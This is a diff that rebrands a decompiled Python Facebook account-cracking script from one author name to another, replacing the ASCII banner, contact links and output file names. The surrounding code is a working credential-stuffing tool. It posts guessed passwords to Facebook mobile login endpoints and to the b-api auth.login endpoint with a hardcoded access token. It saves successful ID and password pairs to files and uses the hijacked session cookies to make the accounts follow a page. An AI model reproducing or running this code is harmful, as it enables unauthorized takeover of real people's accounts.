@@ -1,5 +1,5 @@
-#DECOMPILE BY RIZWAN 
-#FILE NAME (RIZWAN -DEC)
+#DECOMPILE BY PRINCE 
+#FILE NAME (PRINCE -DEC)
 W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
@@ -315,17 +315,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;93m [RIZWAN -OK ] {idf} | {pw}')
+				print( f'\r\x1b[1;93m [PRINCE -OK ] {idf} | {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [RIZWAN -OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [PRINCE -OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/RIZWAN -OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/PRINCE -OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -353,17 +353,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;92m [RIZWAN -Ok] {idf} | {pw}')
+				rint( f'\r\x1b[1;92m [PRINCE -Ok] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [RIZWAN -OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [PRINCE -OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/RIZWAN .txt','a').write('%s\n' % wrt)
+				open('/sdcard/PRINCE .txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -378,46 +378,13 @@ def follow(ses,coki):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
  
-logo = """\033[1;30m
-                  ▉▉▉▉
-                 ▂▉▉▉▉▂
-                \033[1;33m╰▏ ┛┗ ▕╯
-                 ╲ 👅 ╱
-                 \033[1;32m╱▔╲╱▔╲
-               ╱ ╱▏╭╮▕╲ ╲
-               ╲ ╲▏╭╮▕╱ ╱       \033[1;31m╔═╗  ╔╦╗  ╔═╗
-                \033[1;35m ╲▉▉▉▉╱         \033[1;31m╠═╣   ║   ╠╣
-                \033[1;34m  ▏╭╮▕          \033[1;31m╩ ╩   ╩   ╚  
-                \033[1;34m  ▏▏▕▕
-                  ▏▏▕▕
-                \033[1;31m ╭╰ ╮╭╰ ╮
-               \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
-\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-
-
-
-  _____  _____ ________          __     _   _  
- |  __ \|_   _|___  /\ \        / /\   | \ | | 
- | |__) | | |    / /  \ \  /\  / /  \  |  \| | 
- |  _  /  | |   / /    \ \/  \/ / /\ \ | . ` | 
- | | \ \ _| |_ / /__    \  /\  / ____ \| |\  | 
- |_|  \_\_____/_____|    \/  \/_/    \_\_| \_| 
-                                               
-                                               
-
-                                       
-                                       
-
-\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR RIZWAN 
-\033[1;39m━▷ \033[0;91m𝙏𝙀𝘼𝙈     \033[1;39m◈✙◈\033[1;31m TEAM OF RIZWAN 
-\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mRIZWAN  TRICKER
-\033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mBAAP.HUN.TERA.MERY.BACHY
-\033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFACEBOOK ZONE 🙂🙈
-\033[1;39m━▷ \033[0;91m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;35mSTARTING EXIT SELECT AND JOIN
-\033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE AND ENJOY
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.2
-\033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝗥𝗖𝗦 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 𝗥𝗖𝗦
+logo = """
+██████╗░██████╗░██╗███╗░░██╗░█████╗░███████╗
+██╔══██╗██╔══██╗██║████╗░██║██╔══██╗██╔════╝
+██████╔╝██████╔╝██║██╔██╗██║██║░░╚═╝█████╗░░
+██╔═══╝░██╔══██╗██║██║╚████║██║░░██╗██╔══╝░░
+██║░░░░░██║░░██║██║██║░╚███║╚█████╔╝███████╗
+╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
 class Main:
@@ -441,10 +408,10 @@ class Main:
 			exit()
 		elif baloch in ["2", "02"]:
 			print("    CHAL BAGH 🤭")
-			os.system(" http://Wa.me/+923017787729")
+			os.system(" PRINCE KUMAR")
 			exit()
 		elif baloch in ["1", "01"]:
-			os.system(" https://www.facebook.com/ansar.ahmad.75033")
+			os.system(" PRINCE KUMAR")
 			print("")
 			time.sleep(2.0)
 			print("\033[1;37m    Type Your Channel Name")
@@ -901,15 +868,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
-				print("\r \033[0;92m[RIZWAN -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[PRINCE -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-RIZWAN -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-PRINCE -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[RIZWAN -OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[PRINCE -OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-RIZWAN -OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-PRINCE -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1332,15 +1299,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[RIZWAN -OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[PRINCE -OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-RIZWAN -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-PRINCE -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[RIZWAN -OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[PRINCE -OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-RIZWAN -OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-PRINCE -OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
